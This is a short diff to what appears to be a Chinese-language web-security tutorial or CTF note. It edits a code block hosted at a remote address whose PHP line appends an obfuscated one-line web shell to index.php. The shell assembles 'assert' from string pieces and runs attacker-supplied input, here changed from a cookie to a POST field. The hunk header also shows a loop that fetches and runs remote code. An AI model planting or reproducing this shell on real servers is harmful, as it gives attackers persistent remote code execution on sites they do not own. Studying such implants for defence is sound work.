@@ -287,7 +287,7 @@ while($code = file_get_contents($remote_file)){
 **`http://182.168.2.2/file.txt`**
 
 ```
-file_put_contents('index.php','<?php $a="a"."s"."se"."rt";$a($_COOKIE[1]);?>',FILE_APPEND);
+file_put_contents('index.php','<?php $a="a"."s"."se"."rt";$a(\$_POST[1]);?>',FILE_APPEND);
 //FILE_APPEND追加写入, 单引号括起来，$无需转义
 ```
 
